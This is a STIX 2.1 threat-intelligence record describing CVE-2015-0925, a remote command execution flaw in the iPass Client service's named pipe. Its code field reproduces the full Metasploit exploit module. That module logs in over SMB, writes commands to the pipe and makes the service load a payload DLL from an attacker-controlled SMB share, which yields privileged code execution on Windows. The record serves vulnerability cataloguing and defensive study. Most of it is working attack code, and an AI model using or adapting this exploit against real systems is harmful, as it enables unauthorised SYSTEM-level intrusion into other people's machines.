{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--edc3ed7b-3711-47b5-86d5-5be561232721",
    "created": "2024-08-14T16:56:06.203208Z",
    "modified": "2024-08-14T16:56:06.203212Z",
    "name": "IPass Control Pipe Remote Command Execution",
    "description": " This module exploits a vulnerability in the IPass Client service. This service provides a named pipe which can be accessed by the user group BUILTIN\\Users. This pipe can be abused to force the service to load a DLL from a SMB share. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/ipass_pipe_exec.rb",
            "external_id": "ipass_pipe_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-0925"
        },
        {
            "source_name": "reference",
            "url": "http://codewhitesec.blogspot.de/2015/02/how-i-could-ipass-your-client-security.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::SMB::Client::Authenticated\n  include Msf::Exploit::Remote::SMB::Server::Share\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'IPass Control Pipe Remote Command Execution',\n      'Description'    => %q{\n        This module exploits a vulnerability in the IPass Client service. This service provides a\n        named pipe which can be accessed by the user group BUILTIN\\Users. This pipe can be abused\n        to force the service to load a DLL from a SMB share.\n      },\n      'Author'         =>\n        [\n          'Matthias Kaiser', # Vulnerability discovery\n          'h0ng10 <info[at]mogwaisecurity.de>', # Metasploit Module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2015-0925' ],\n          [ 'OSVDB', '117423' ],\n          [ 'BID', '72265' ],\n          [ 'URL', 'http://codewhitesec.blogspot.de/2015/02/how-i-could-ipass-your-client-security.html' ],\n        ],\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'         =>\n        {\n          'Space'       => 2048,\n          'DisableNops' => true\n        },\n      'Platform'        => 'win',\n      'Targets'         =>\n        [\n          [ 'Windows x32', { 'Arch' => ARCH_X86 } ],\n          [ 'Windows x64', { 'Arch' => ARCH_X64 } ]\n        ],\n      'Privileged'      => true,\n      'DisclosureDate'  => '2015-01-21',\n      'DefaultTarget'   => 0))\n\n    register_options(\n      [\n        OptInt.new('SMB_DELAY', [true, 'Time that the SMB Server will wait for the payload request', 15])\n      ])\n\n    deregister_options('FILE_CONTENTS', 'FILE_NAME', 'SHARE', 'FOLDER_NAME')\n  end\n\n  def check\n    echo_value = rand_text_alphanumeric(rand(10) + 10)\n\n    begin\n      response = send_command(\"System.Echo #{echo_value}\")\n      if response =~ Regexp.new(echo_value)\n        return Exploit::CheckCode::Vulnerable\n      else\n        return Exploit::CheckCode::Unknown\n      end\n    rescue Rex::ConnectionError => e\n      vprint_error(\"Connection failed: #{e.class}: #{e}\")\n      return Msf::Exploit::CheckCode::Unknown\n    rescue Rex::Proto::SMB::Exceptions::LoginError => e\n      vprint_error(\"Error during login: #{e}\")\n      return Msf::Exploit::CheckCode::Unknown\n    rescue Rex::Proto::SMB::Exceptions::ErrorCode, RubySMB::Error::RubySMBError => e\n      vprint_error(e.to_s)\n      return Msf::Exploit::CheckCode::Unknown\n    end\n  end\n\n  def setup\n    super\n    self.file_name = \"#{Rex::Text.rand_text_alpha(7)}.dll\"\n    self.share = Rex::Text.rand_text_alpha(5)\n  end\n\n  def primer\n    self.file_contents = generate_payload_dll\n    print_status(\"File available on #{unc}...\")\n    send_command(\"iPass.SWUpdateAssist.RegisterCOM #{unc}\")\n  end\n\n  def send_command(command)\n    # The connection is closed after each command, so we have to reopen it\n    connect\n    smb_login\n    pipe = simple.create_pipe('\\\\IPEFSYSPCPIPE')\n    pipe.write(Rex::Text.to_unicode(command))\n    response = Rex::Text.to_ascii(pipe.read)\n\n    response\n  end\n\n\n  def exploit\n    begin\n      Timeout.timeout(datastore['SMB_DELAY']) { super }\n    rescue Timeout::Error\n      # do nothing... just finish exploit and stop smb server...\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-01-21",
    "x_mitre_platforms": [
        "win'"
    ]
}